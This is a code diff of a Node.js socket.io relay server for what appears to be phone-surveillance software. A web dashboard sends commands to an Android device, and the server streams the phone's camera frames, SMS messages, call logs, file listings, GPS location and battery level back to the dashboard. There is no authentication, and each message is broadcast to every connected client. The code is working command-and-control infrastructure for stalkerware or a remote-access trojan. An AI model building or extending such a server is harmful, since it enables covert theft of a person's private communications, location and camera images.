@@ -1,58 +1,74 @@
 const express = require('express');
 const app = express();
-const http = require('http').createServer(app);
-const path = require('path');
+const http = require('http');
+const server = http.createServer(app);
+const { Server } = require("socket.io");
 
-// Fix: Add CORS and compatibility for Android Socket.io clients
-const io = require('socket.io')(http, {
-    cors: {
-        origin: "*", 
-        methods: ["GET", "POST"]
-    },
-    allowEIO3: true // Required if your Android app uses Socket.io v2.x
-});
-
-app.use(express.static(path.join(__dirname, 'public')));
-
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
-
-io.on('connection', (socket) => {
-    console.log('✅ A device connected (Phone or Dashboard):', socket.id);
-
-    // Relays commands from Web Dashboard -> Phone
-    socket.on('parent-command', (data) => {
-        console.log('📡 Dashboard sent command:', data);
-        io.emit('phone-execute', data);
-    });
-
-    // Relays data from Phone -> Web Dashboard
-    socket.on('data-stream', (data) => {
-        socket.broadcast.emit('render-feed', data);
-    });
-socket.on('sms-data', (data) => io.emit('sms-data', data));
-socket.on('call-data', (data) => io.emit('call-data', data));
-socket.on('file-data', (data) => io.emit('file-data', data));
-   socket.on('battery-update', (lvl) => {
-    console.log("Battery received from phone:", lvl);
-    // Use io.emit to send to EVERYONE (including the dashboard)
-    io.emit('render-battery', lvl); 
-});
-
-    socket.on('location-update', (coords) => {
-        console.log('📍 Location Received:', coords);
-        socket.broadcast.emit('render-location', coords);
-    });
-
-    socket.on('disconnect', () => {
-        console.log('❌ Device disconnected');
-    });
+// Increase maximum data size to handle high-res camera photos
+const io = new Server(server, {
+  maxHttpBufferSize: 1e8 // 100 MB
 });
 
 const PORT = process.env.PORT || 3000;
-http.listen(PORT, () => {
-    console.log(`🚀 Server monitoring active on port ${PORT}`);
+
+// Serve the index.html file from the same folder
+app.get('/', (req, res) => {
+  res.sendFile(__dirname + '/index.html');
 });
 
+io.on('connection', (socket) => {
+  console.log('A user connected: ' + socket.id);
 
+  // --- COMMAND FLOW: Web -> Server -> Phone ---
+  socket.on('phone-execute', (cmd) => {
+    console.log('Command received from Web:', cmd);
+    // Broadcast the command to the Android device
+    io.emit('phone-execute', cmd);
+  });
+
+  // --- DATA FLOW: Phone -> Server -> Web ---
+
+  // 1. Handle Battery Updates
+  socket.on('battery-update', (data) => {
+    console.log('Battery Level:', data);
+    io.emit('battery-update', data);
+  });
+
+  // 2. Handle GPS/Location Updates
+  socket.on('location-update', (data) => {
+    console.log('Location received:', data);
+    io.emit('location-update', data);
+  });
+
+  // 3. Handle Camera Image Streams (Base64)
+  socket.on('data-stream', (base64Data) => {
+    console.log('Camera frame received');
+    io.emit('data-stream', base64Data);
+  });
+
+  // 4. Handle SMS Logs
+  socket.on('sms-data', (data) => {
+    console.log('SMS Data received');
+    io.emit('sms-data', data);
+  });
+
+  // 5. Handle Call Logs
+  socket.on('call-data', (data) => {
+    console.log('Call Log data received');
+    io.emit('call-data', data);
+  });
+
+  // 6. Handle File Manager Data
+  socket.on('file-data', (data) => {
+    console.log('File list received');
+    io.emit('file-data', data);
+  });
+
+  socket.on('disconnect', () => {
+    console.log('User disconnected');
+  });
+});
+
+server.listen(PORT, () => {
+  console.log(`Server listening on port ${PORT}`);
+});
